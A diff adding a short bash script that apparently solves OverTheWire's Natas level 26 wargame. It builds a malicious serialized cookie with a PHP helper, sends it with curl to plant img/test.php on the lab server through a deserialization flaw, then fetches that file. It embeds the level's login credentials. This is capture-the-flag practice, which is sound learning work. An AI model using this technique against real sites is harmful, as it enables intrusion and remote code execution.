@@ -1,0 +1,7 @@
+#!/bin/bash
+
+file="img/test.php"
+cookie=$(php ./unserialize.php)
+curl --user natas26:oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T http://natas26.natas.labs.overthewire.org --cookie "drawing=$cookie" > /dev/null 2>&1
+
+curl --user natas26:oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T http://natas26.natas.labs.overthewire.org/img/test.php 2>&1 | tail -n1
